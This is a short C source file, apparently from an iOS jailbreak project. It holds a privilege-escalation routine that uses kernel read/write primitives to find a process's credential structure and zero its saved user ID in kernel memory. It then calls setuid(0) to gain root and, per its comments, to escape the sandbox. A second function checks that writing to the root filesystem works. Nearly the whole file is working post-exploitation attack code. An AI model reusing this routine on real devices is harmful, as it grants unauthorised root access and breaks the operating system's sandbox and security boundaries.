#include "include/tools.h"
#include "include/kernel.h"

int safe_elevate(pid_t pid)
{
    addr64_t ucred_s = read_pointer(find_proc(pid) + __ucred_offset);

    if (!ucred_s)
    {
        printf("Failed to read my ucred struct\n");
        return 1;
    }

    if (wk32(ucred_s + __cr_svuid_offset, 0))
    {
        printf("Ucred writing failed!");
        return 1;
    }

    // yes, setuid(0) need to be called twice - from taurine
    if (setuid(0) || setuid(0) || setgid(0) || getuid()) // apparently this just works after nulling __cs_svuid??
    {
        printf("Elevation failed :( UID: %d ", getuid());
        return 1;
    }

    printf("I'm freeee - UID: %d ", getuid());
    return 0; // apparently getting root is enough to break out of sandbox?
}

int test_rw()
{
    const char *name = "/test.txt";
    FILE *fptr = fopen(name, "w+");

    char string[] = "hello world!";
    char *buffer = malloc(sizeof(string));

    int status = 1;

    if (!fptr || !fwrite(string, sizeof(char), sizeof(string), fptr))
        printf("Failed to write to root! :(\n");
    else
    {
        fflush(fptr);
        fseek(fptr, 0, SEEK_SET);

        if (!fread(buffer, sizeof(char), sizeof(string), fptr))
            printf("failed to read file from root! :( \n");
        else if (strcmp(string, buffer))
            printf("Partial r/w?? wrote: %s but read %s\n", string, buffer);
        else
        {
            status = 0;
            printf("R/W works!");
        }

        if (fclose(fptr) || remove(name))
        {
            printf("Error closing/removing file...");
            fclose(fptr);
        }
    }

    return status;
}